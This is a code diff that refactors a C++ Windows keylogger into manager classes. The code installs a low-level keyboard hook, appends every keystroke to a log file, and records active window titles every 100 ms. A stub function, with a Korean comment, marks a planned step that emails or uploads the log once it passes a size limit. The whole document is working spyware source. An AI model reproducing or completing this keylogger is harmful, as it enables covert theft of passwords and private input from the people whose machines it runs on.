@@ -2,34 +2,41 @@
 #define MAX_FILE_SIZE 20000
 #include "stdafx.h"
 #include "filemanager.h"
-// #include "mailmanager.h"
 #include "winmanager.h"
+#include "strConvert.h"
 #include "KeyLogger.h"
+
 using namespace std;
+using namespace file;
+using namespace win;
+using namespace str;
 
 FILE* f;
 HHOOK hKeyboardHook;
-static int keysPressed = 0;
+static int keysPressed;
+fileManager FM;
+winManager WIN;
+strConvert STR;
 
 DWORD WINAPI Keylogger(LPVOID lpParm) {
-    HINSTANCE hins;
-    hins = GetModuleHandle(NULL);
-    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Hook, hins, 0);
+	HINSTANCE hins;
+	hins = GetModuleHandle(NULL);
+	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Hook, hins, 0);
 
-    MSG message;
-    while (GetMessage(&message, NULL, 0, 0)) {
-        TranslateMessage(&message);
-        DispatchMessage(&message);
-    }
+	MSG message;
+	while (GetMessage(&message, NULL, 0, 0)) {
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
 
-    UnhookWindowsHookEx(hKeyboardHook);
-    return 0;
+	UnhookWindowsHookEx(hKeyboardHook);
+	return 0;
 }
 
 LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keystroke
 	char* workFullPath;
 	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {
-		workFullPath = getlogfilepath(getlogfilename());
+		workFullPath = FM.getlogfilepath(FM.getlogfilename());
 		if (workFullPath) {
 			f = fopen(workFullPath, "a+");
 		}
@@ -51,7 +58,7 @@ LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keyst
 		}
 		else {
 			if (f != NULL)
-				fprintf(f, "%s", ConvertWCtoC(lpszKeyName));
+				fprintf(f, "%s", STR.ConvertWCtoC(lpszKeyName));
 		}
 		if ((keysPressed % 20) == 0) {
 			fprintf(f, "\n");
@@ -63,21 +70,23 @@ LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keyst
 }
 
 void wintitle() {		//  logging the currently running windows
-    string oldtitle = gettitle();
-	logger(string(gettitle()) + "\n");
+    string oldtitle = WIN.gettitle();
+	FM.logger(string(WIN.gettitle()) + "\n");
     while (TRUE) {
         Sleep(100);
-        if (gettitle() != oldtitle) {
-            logger("\n" + string(gettitle()) + "\n");
+        if (WIN.gettitle() != oldtitle) {
+            FM.logger("\n" + string(WIN.gettitle()) + "\n");
         }
-        oldtitle = gettitle();
+        oldtitle = WIN.gettitle();
     }
 }
 
-void FSD() {		// File size detetor
+// TBD
+// 로그 파일을 이메일로 전송하기전 최대 파일 사이지를 정해주는 함수..
+void FSD() {		// File size detetor 
     while (TRUE) {
         Sleep(1000);
-        if (getfilesize() > MAX_FILE_SIZE) {
+        if (FM.getfilesize() > MAX_FILE_SIZE) {
 			/* sends logfile to email
 			...
 			or upload to server*/
